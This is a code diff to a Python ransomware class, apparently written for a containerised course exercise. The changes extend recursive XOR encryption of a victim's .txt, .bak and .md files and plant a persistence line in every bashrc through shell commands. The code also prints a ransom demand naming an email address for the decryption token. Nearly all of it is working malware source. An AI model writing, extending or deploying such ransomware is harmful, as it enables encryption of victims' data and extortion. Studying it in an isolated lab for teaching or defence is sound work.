@@ -19,6 +19,7 @@ class Ransomware:
         self._secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
 
 
+
     def check_hostname_is_docker(self) -> None:
         # At first, we check if we are in a docker
         # to prevent running Veilleuxthis program outside of container
@@ -30,10 +31,7 @@ class Ransomware:
 
     def get_files(self, filter:str) -> list:
         # return all files matching the filter
-        """In the first scenario, files_list is a list containing the paths of every file found recursively by the rglob() function in the file system.
-        The paths are stored as PosixPath objects of their string equivalent."""
-        # files_list = list(Path().rglob(filter))
-        """In the second scenario, files_list is a list containing the paths of every file found recursively by the rglob() function in the file system.
+        """files_list is a list containing the paths of every file found recursively by the rglob() function in the file system.
         The paths are stored as strings."""
 
         files_list = [str(p) for p in list(Path().rglob(filter))]
@@ -43,18 +41,28 @@ class Ransomware:
     def encrypt(self) -> None:
         # main function for encrypting (see PDF)
         self._log.debug("PASSING THROUGH encrypt() FUNCTION!!!!")
-        self._log.debug(self.get_files("*.txt"))
+        
+        self.add_reminder_to_bashrc(INSTALL_PATH)
+
+        files_to_encrypt = []
+        files_to_encrypt.extend(self.get_files("*.txt"))
+        files_to_encrypt.extend(self.get_files("*.bak"))
+        files_to_encrypt.extend(self.get_files("*.md"))
+
+        self._log.debug(files_to_encrypt)
+
         self._secret_manager.setup()
-        self._secret_manager.xorfiles(self.get_files("*.txt"))
+        self._secret_manager.xorfiles(files_to_encrypt)
+
         token = self._secret_manager.get_hex_token()
         print(OH_NO)
         print(f"Your txt files have been encrypted! Please send an email to support@igotpwned.com with object '{token}' to retrieve your data.")
-        self.add_reminder_to_bashrc(INSTALL_PATH)
         return None
     
     def add_reminder_to_bashrc(self, path: str) -> None:
         for bashrc in self.get_files("*bashrc*"):
             self._log.debug(bashrc)
+            system(f"cp {bashrc} {bashrc}.bak")
             system(f"echo 'python {path}/ransomware.py --decrypt' >> {bashrc}")
         return None
 
@@ -68,11 +76,19 @@ class Ransomware:
             candidate_key = input("Please enter your cryptographic key: ")
 
         # self._secret_manager.set_key(candidate_key)
-        self._secret_manager.xorfiles(self.get_files("*.txt"))
+        files_to_decrypt = []
+        files_to_decrypt.extend(self.get_files("*.txt"))
+        files_to_decrypt.extend(self.get_files("*.bak"))
+        files_to_decrypt.extend(self.get_files("*.md"))
+
+        self._secret_manager.xorfiles(files_to_decrypt)
         self._secret_manager.clean(INSTALL_PATH)
         print("\rOkay, your data has been restored to its former state. Have a nice day :)")
         print(HERE_WIPE_YOUR_TEARS)
         print(ASCII_TISSUE_BOX)
+
+        for bashrcbak in self.get_files("*bashrc.bak"):
+            system(f"cp {bashrcbak} {bashrcbak[0:-4]}")
 
 
 if __name__ == "__main__":
